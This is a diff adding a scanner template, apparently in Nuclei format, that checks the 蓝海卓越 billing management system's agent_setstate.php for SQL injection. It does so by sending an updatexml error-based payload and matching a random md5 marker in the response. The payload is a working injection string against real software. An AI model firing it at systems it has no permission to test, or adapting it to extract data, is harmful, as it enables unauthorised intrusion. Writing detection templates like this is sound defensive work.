@@ -1,0 +1,21 @@
+id: poc-yaml-lhzy-system-agent-setstate-sqli
+info:
+  name: 蓝海卓越计费管理系统 agent_setstate.php SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/agent_setstate.php?id=(updatexml(1,concat(0x7e,(select%20md5({{t1}})),0x7e),1))'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - contains(body, t2)
